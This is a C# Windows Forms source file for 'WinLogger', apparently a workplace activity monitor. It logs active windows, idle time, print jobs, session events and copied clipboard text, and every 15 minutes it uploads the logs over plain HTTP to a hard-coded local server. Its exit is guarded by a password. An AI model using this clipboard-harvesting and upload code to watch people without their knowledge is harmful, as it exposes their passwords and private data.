using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Timers;
using System.Security.Principal;
using System.Management;
using Microsoft.Win32;
using System.Net;

namespace WinLogger
{
    public partial class Form1 : Form
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct LASTINPUTINFO
        {
            public uint cbSize;
            public uint dwTime;
        }

        [DllImport("user32.dll")] static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        private NotifyIcon trayIcon;
        private System.Timers.Timer timer;
        private System.Timers.Timer clipboardTimer;
        private System.Timers.Timer uploadTimer;

        private string currentApp = "";
        private DateTime startTime;
        private readonly string baseLogDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinLogger");
        private string logPath;
        private string clipboardLogPath;

        private bool isIdle = false;
        private DateTime idleStart;
        private string lastClipboardText = "";
        private ManagementEventWatcher printWatcher;
        private const string ExitPassword = "end";
        private DateTime lastCheckedTime = DateTime.Now;

        public Form1()
        {
            InitializeComponent();

            Directory.CreateDirectory(baseLogDir);
            logPath = Path.Combine(baseLogDir, "app_log.txt");
            clipboardLogPath = Path.Combine(baseLogDir, "clipboard_log.txt");

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            trayIcon = new NotifyIcon
            {
                Text = "WinLogger Running",
                Icon = SystemIcons.Information,
                Visible = true
            };

            var contextMenuStrip = new ContextMenuStrip();
            var exitItem = new ToolStripMenuItem("Exit (Password)");
            exitItem.Click += OnExitClick;
            contextMenuStrip.Items.Add(exitItem);
            trayIcon.ContextMenuStrip = contextMenuStrip;

            startTime = DateTime.Now;

            timer = new System.Timers.Timer(1000);
            timer.Elapsed += CheckActiveWindow;
            timer.Start();

            clipboardTimer = new System.Timers.Timer(1000);
            clipboardTimer.Elapsed += CheckClipboard;
            clipboardTimer.Start();

            uploadTimer = new System.Timers.Timer(900000); // 15 mins
            uploadTimer.Elapsed += UploadLogs;
            uploadTimer.Start();

            StartPrintWatcher();
            SystemEvents.SessionSwitch += OnSessionSwitch;
            SystemEvents.PowerModeChanged += OnPowerModeChanged;
            SystemEvents.SessionEnding += OnSessionEnding;
        }

        private void Log(string file, string line)
        {
            File.AppendAllText(file, line + "\n");
        }

        private void LogApp(string type, string detail1, string detail2 = "", string duration = "")
        {
            Log(logPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss},{type},{detail1},{detail2},{duration}");
        }

        private void LogClipboard(string text)
        {
            Log(clipboardLogPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss},Clipboard," + text.Replace("\n", " ").Replace(",", " "));
        }

        private TimeSpan GetIdleTime()
        {
            LASTINPUTINFO lastInput = new LASTINPUTINFO();
            lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
            GetLastInputInfo(ref lastInput);
            return TimeSpan.FromMilliseconds(Environment.TickCount - lastInput.dwTime);
        }

        private void StartPrintWatcher()
        {
            try
            {
                WqlEventQuery query = new WqlEventQuery("SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PrintJob'");
                printWatcher = new ManagementEventWatcher(query);
                printWatcher.EventArrived += (sender, e) =>
                {
                    try
                    {
                        var job = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                        string doc = job["Document"]?.ToString() ?? "Unknown";
                        string user = job["Owner"]?.ToString() ?? Environment.UserName;
                        string printer = job["Name"]?.ToString() ?? "Unknown";
                        LogApp("Print", user, doc + " to " + printer);
                    }
                    catch (Exception ex) { Log(Path.Combine(baseLogDir, "error_log.txt"), ex.ToString()); }
                };
                printWatcher.Start();
            }
            catch (Exception ex) { Log(Path.Combine(baseLogDir, "error_log.txt"), ex.ToString()); }
        }

        private void OnSessionSwitch(object sender, SessionSwitchEventArgs e)
        {
            string reason = e.Reason.ToString();
            LogApp("Session", reason);
        }

        private void OnPowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            LogApp("Power", e.Mode.ToString());
        }

        private void OnSessionEnding(object sender, SessionEndingEventArgs e)
        {
            string reason = e.Reason.ToString();
            LogApp("Shutdown", reason);
        }

        private void CheckActiveWindow(object sender, ElapsedEventArgs e)
        {
            try
            {
                TimeSpan gap = DateTime.Now - lastCheckedTime;
                lastCheckedTime = DateTime.Now;
                if (gap.TotalSeconds > 15)
                {
                    LogApp("Resume", $"gap {gap.TotalSeconds:0}s");
                }

                TimeSpan idleTime = GetIdleTime();
                if (idleTime.TotalMinutes >= 5)
                {
                    if (!isIdle)
                    {
                        isIdle = true;
                        idleStart = DateTime.Now;
                        LogApp("IdleStart", "System idle");
                    }
                    return;
                }
                else if (isIdle)
                {
                    isIdle = false;
                    var idleEnd = DateTime.Now;
                    var idleDuration = idleEnd - idleStart;
                    LogApp("IdleEnd", "System active", "", idleDuration.ToString(@"hh\:mm\:ss"));
                }

                IntPtr handle = GetForegroundWindow();
                StringBuilder buffer = new StringBuilder(256);
                if (GetWindowText(handle, buffer, 256) > 0)
                {
                    GetWindowThreadProcessId(handle, out uint pid);
                    Process process = Process.GetProcessById((int)pid);
                    string appName = process.ProcessName;
                    string windowTitle = buffer.ToString();
                    string combined = $"{appName} - {windowTitle}";

                    if (combined != currentApp)
                    {
                        if (!string.IsNullOrEmpty(currentApp))
                        {
                            TimeSpan duration = DateTime.Now - startTime;
                            LogApp("App", currentApp, "", duration.ToString(@"hh\:mm\:ss"));
                        }
                        currentApp = combined;
                        startTime = DateTime.Now;
                    }
                }
            }
            catch (Exception ex) { Log(Path.Combine(baseLogDir, "error_log.txt"), ex.ToString()); }
        }

        private void CheckClipboard(object? sender, ElapsedEventArgs? e)
        {
            try
            {
                string text = "";
                if (InvokeRequired)
                {
                    Invoke(new MethodInvoker(() => { if (Clipboard.ContainsText()) text = Clipboard.GetText(); }));
                }
                else
                {
                    if (Clipboard.ContainsText()) text = Clipboard.GetText();
                }

                if (!string.IsNullOrWhiteSpace(text) && text != lastClipboardText)
                {
                    lastClipboardText = text;
                    LogClipboard(text);
                }
            }
            catch { }
        }

        private async void UploadLogs(object? sender, ElapsedEventArgs? e)
        {
            try
            {
                string username = Environment.UserName;
                string url = "http://192.168.5.13/pclog/upload.php";

                using (HttpClient client = new HttpClient())
                {
                    // Upload app_log.txt
                    using (var form = new MultipartFormDataContent())
                    {
                        form.Add(new StringContent(username), "user");
                        form.Add(new StringContent("app_log"), "file");

                        byte[] fileBytes = File.ReadAllBytes(logPath);
                        form.Add(new ByteArrayContent(fileBytes), "file", "app_log.txt");

                        var response = await client.PostAsync($"{url}?user={username}&file=app_log", form);
                        if (!response.IsSuccessStatusCode)
                        {
                            string result = await response.Content.ReadAsStringAsync();
                            Log(Path.Combine(baseLogDir, "error_log.txt"), $"[UploadLogs] app_log: {response.StatusCode} - {result}");
                        }
                    }

                    // Upload clipboard_log.txt
                    using (var form = new MultipartFormDataContent())
                    {
                        form.Add(new StringContent(username), "user");
                        form.Add(new StringContent("clipboard_log"), "file");

                        byte[] fileBytes = File.ReadAllBytes(clipboardLogPath);
                        form.Add(new ByteArrayContent(fileBytes), "file", "clipboard_log.txt");

                        var response = await client.PostAsync($"{url}?user={username}&file=clipboard_log", form);
                        if (!response.IsSuccessStatusCode)
                        {
                            string result = await response.Content.ReadAsStringAsync();
                            Log(Path.Combine(baseLogDir, "error_log.txt"), $"[UploadLogs] clipboard_log: {response.StatusCode} - {result}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Log(Path.Combine(baseLogDir, "error_log.txt"), "[UploadLogs] " + ex.Message);
            }
        }


        private void OnExitClick(object sender, EventArgs e)
        {
            string input = Microsoft.VisualBasic.Interaction.InputBox("Enter exit password:", "Exit Logger", "");
            if (input == ExitPassword)
            {
                trayIcon.Visible = false;
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Incorrect password.", "Access Denied", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            trayIcon.Visible = false;
            SystemEvents.SessionSwitch -= OnSessionSwitch;
            SystemEvents.PowerModeChanged -= OnPowerModeChanged;
            SystemEvents.SessionEnding -= OnSessionEnding;
            base.OnFormClosing(e);
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
